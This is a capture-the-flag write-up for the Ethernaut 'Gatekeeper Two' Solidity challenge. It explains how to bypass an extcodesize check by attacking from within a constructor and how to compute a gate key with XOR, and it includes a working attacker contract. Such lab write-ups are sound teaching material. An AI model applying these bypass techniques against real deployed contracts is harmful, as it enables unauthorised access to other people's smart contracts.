---
layout: writeup
title: "Gatekeeper Two"
level: "Hard"
category: "Ethernaut"
description: "Bypass assembly-level code size checks and solve a bitwise XOR equation."
---

## Analysis

* **Gate 1:** Standard `msg.sender != tx.origin` (use a contract).
* **Gate 2:** Uses assembly `extcodesize(caller())` and requires it to be `0`. 
    > **The Trick:** During a contract's `constructor`, its `extcodesize` is still 0. The attack must happen entirely within the constructor.
* **Gate 3:** Requires `uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max`.



---

## Solution

In XOR operations, if $A \oplus B = C$, then $A \oplus C = B$. We can calculate the required `_gateKey` by XORing the hash of the attacker's address with the maximum `uint64` value.

---

**Attacker Contract (Solidity):**

<pre class="plain-code"><code>
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;
 
 interface IGateKeeperTwo{
    function enter(bytes8 _gatekey) external returns(bool);
 }

 contract AttackGateTwo{
   IGateKeeperTwo public gatekeeper;
    constructor(address _gatekeeper){
        gatekeeper=IGateKeeperTwo(_gatekeeper);
        bytes8 key=bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this)))))^type(uint64).max);

        IGateKeeperTwo(gatekeeper).enter(key);
    }
 }
</code></pre>

---